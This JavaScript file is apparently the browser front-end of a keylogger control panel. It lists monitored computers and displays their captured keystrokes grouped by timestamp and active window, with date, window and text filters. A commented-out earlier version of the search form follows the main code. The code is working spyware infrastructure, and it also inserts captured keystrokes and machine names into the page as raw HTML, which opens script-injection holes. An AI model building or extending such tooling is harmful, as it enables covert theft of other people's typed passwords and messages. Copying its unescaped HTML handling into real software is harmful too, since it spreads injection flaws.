document.addEventListener('DOMContentLoaded', function() {
    const computersTableBody = document.getElementById('computersTable').querySelector('tbody');
    const keystrokesSection = document.getElementById('keystrokesSection');
    const keystrokesTableBody = document.getElementById('keystrokesTable').querySelector('tbody');
    const computerNameSpan = document.getElementById('computerName');
    const filterForm = document.getElementById('filterForm');

    function fetchComputers() {
        fetch('/api/machines')
            .then(response => response.json())
            .then(data => {
                computersTableBody.innerHTML = '';
                data.machines.forEach(machine => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${machine}</td>
                        <td><button onclick="fetchKeystrokes('${machine}')">View Keystrokes</button></td>
                    `;
                    computersTableBody.appendChild(row);
                });
            })
            .catch(error => console.error('Error fetching computers:', error));
    }

    window.fetchKeystrokes = function(machine) {
        const date = document.getElementById('filterDate').value;
        const windowName = document.getElementById('filterWindow').value;
        const searchText = document.getElementById('filterText').value;

        let url = `/api/get_keystrokes?machine=${machine}`;
        if (date) url += `&date=${date}`;
        if (windowName) url += `&window=${windowName}`;
        if (searchText) url += `&searchText=${searchText}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    alert(data.error);
                    return;
                }
                computerNameSpan.textContent = machine;
                keystrokesTableBody.innerHTML = '';
                for (const [timestamp, windows] of Object.entries(data.logs)) {
                    for (const [window, keystrokes] of Object.entries(windows)) {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${timestamp}</td>
                            <td>${window}</td>
                            <td>${keystrokes}</td>
                        `;
                        keystrokesTableBody.appendChild(row);
                    }
                }
                keystrokesSection.style.display = 'block';
            })
            .catch(error => console.error('Error fetching keystrokes:', error));
    };

    document.getElementById('refreshButton').addEventListener('click', fetchComputers);
    filterForm.addEventListener('submit', function(event) {
        event.preventDefault();
        const machine = computerNameSpan.textContent;
        if (machine) {
            fetchKeystrokes(machine);
        }
    });

    fetchComputers();
});

// document.getElementById('searchForm').addEventListener('submit', function(event) {
//     event.preventDefault();
//     const computer = document.getElementById('computerSelect').value;
//     const date = document.getElementById('date').value;
//     const searchText = document.getElementById('searchText').value;
//     fetch(`/api/get_keystrokes?machine=${computer}&date=${date}`)
//         .then(response => response.json())
//         .then(data => {
//             const resultDiv = document.getElementById('result');
//             if (data.error) {
//                 resultDiv.innerHTML = `<p>Error: ${data.error}</p>`;
//             } else {
//                 let logs = JSON.stringify(data.logs, null, 2);
//                 if (searchText) {
//                     const regex = new RegExp(searchText, 'gi');
//                     logs = logs.replace(regex, match => `<mark>${match}</mark>`);
//                 }
//                 resultDiv.innerHTML = `<h2>Logs for ${data.machine} on ${data.date}</h2><pre>${logs}</pre>`;
//             }
//         })
//         .catch(error => {
//             console.error('Error fetching data:', error);
//         });
// });